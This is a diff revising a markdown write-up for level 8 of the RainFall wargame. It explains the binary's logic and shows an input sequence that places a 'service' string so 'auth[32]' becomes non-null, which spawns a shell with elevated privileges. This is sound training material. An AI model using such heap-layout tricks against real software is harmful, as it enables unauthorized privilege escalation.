@@ -1,9 +1,9 @@
 # Level 8
 
-- Once logged in, you will see a binary `level8`
+Once logged in, you will see a binary `level8`.
 
 ```
-[???]$ ssh localhost -p 4242 -l level8
+$ ssh localhost -p 4242 -l level8
 	  _____       _       ______    _ _
 	 |  __ \     (_)     |  ____|  | | |
 	 | |__) |__ _ _ _ __ | |__ __ _| | |
@@ -28,7 +28,7 @@ level8@RainFall:~$
 ```
 
 
-let's run this and see what this does
+Let's run this and see what this does.
 
 ```
 level8@RainFall:~$ ls
@@ -39,9 +39,7 @@ aaaaaaaaaaaaaaaaaaaaa
 (nil), (nil)
 ```
 
-okay, seems little differnt from past levels.
-
-By taking a look at the binary, there is only main function
+Okay, seems little differnt from past levels. By taking a look at the binary, there is only a `main` function.
 
 ```
 gdb-peda$ info functions
@@ -53,6 +51,8 @@ Non-debugging symbols:
 [...]
 ```
 
+There are two global variables `auth`, and `service`, which might be a hint to the solution.
+
 ```
 gdb-peda$ info variables
 All defined variables:
@@ -63,10 +63,7 @@ Non-debugging symbols:
 0x08049ab0  service
 ```
 
-there is a global variable `auth`, and `service`, which might be a hint to the problem.
-
-
-let's take a look at the main function
+Let's take a look at the main function.
 
 ```
 gdb-peda$ disass main
@@ -212,25 +209,18 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-It is a huge assembly code, but once decompiling them, the program functions
+It is a huge assembly code, but once decompiling them, the program functions as follows:
+1. It first prints the address of auth and service, and prints while looping.
+2. Gets input from the user
+3. Checks first input if it' a string that matches `"auth "` (5 chars including space). If true, it copies over the string after `"auth "` to a `malloc`ed string of size 4. (Max string length after `"auth "` is 30 bytes.)
+4. If the input is `"reset"`, it frees the global variable `auth`.
+5. If the input is `"service"`, it duplicates `buffer` starting after the first 7 chars into the globial variable `service`.
+6. if the input is `"login"`, there is another conditional statement within:
+	1. If `auth[32]` is not `NULL`, it executes `system("/bin/sh")`
+	2. Else, it prints `"Password:\n"` to stdout.
 
 
-- it first prints the address of auth and service, and prints while looping.
-
-- getting an input from user, with looping
-- checks first input if it' a string consistof `auth (5 chars)`
-	- if true, it allocates the address on the heap
-
-- if the input is `reset`, it frees the global variable 'auth'
-
-- if the input is `service`, it duplicates into the globial variable 'service'
-
-- if the input is 'login', there is another conditional statement within:
-	- if the auth[32] is not NULL, it executes `system("/bin/sh")`
-	- else, it only prints `Password:\n` to stdout.
-
-
-let's run the program and see how it works
+Let's run the program and see how it works.
 
 ```
 level8@RainFall:~$ ./level8
@@ -246,17 +236,25 @@ service
 0x804a008, 0x804a018
 ```
 
-giving an input of service after putting the auth, we can see the address of the service. This is because of the malloc(), each pointer is placed right after the prev ones with some padding in between.
+By giving an input of service after putting the auth, we can see the address of the service, and they are very close. With `malloc`, each pointer is placed right after the prev ones with some padding in between.
 
-So, to solve out the problem, in other words, to put 'auth[32]' value set not to zero, we just need to put 32th character into not null, which means, put 16th character of after service, into not null.
+So, to solve the problem, in other words, to get `auth[32]` value set to not zero, we just need to get `auth[32]` to land within the `service` string.
+
+```
+The memory: auth            service123456789012345a
+						^               ^                     ^
+						0x804a008       0x804a018             auth[32]
+```
+
+The exploit in action:
 
 ```
 level8@RainFall:~$ ./level8
 (nil), (nil)
 auth
 0x804a008, (nil)
-service               a <-a on 16th padding
-0x804a008, 0x804a018
+service123456789012345a // <- a on 16th padding
+0x804a008, 0x804a018    // NOTE: 32 chars after 0x804a008 is within 0x804a018 if that is more than 16 chars long
 login
 $ id
 uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
